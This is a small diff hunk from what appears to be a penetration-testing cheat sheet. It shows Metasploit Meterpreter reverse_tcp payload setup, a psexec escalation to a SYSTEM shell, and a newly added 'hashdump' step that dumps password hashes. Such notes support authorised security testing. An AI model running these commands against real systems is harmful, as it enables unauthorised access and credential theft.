@@ -273,7 +273,7 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 or
 set PAYLOAD linux/x86/meterpreter/reverse_tcp
 msf > run*
-
+> hashdump
 
 From admin to system
     *psexec.exe -i -s %SystemRoot%\system32\cmd.exe*
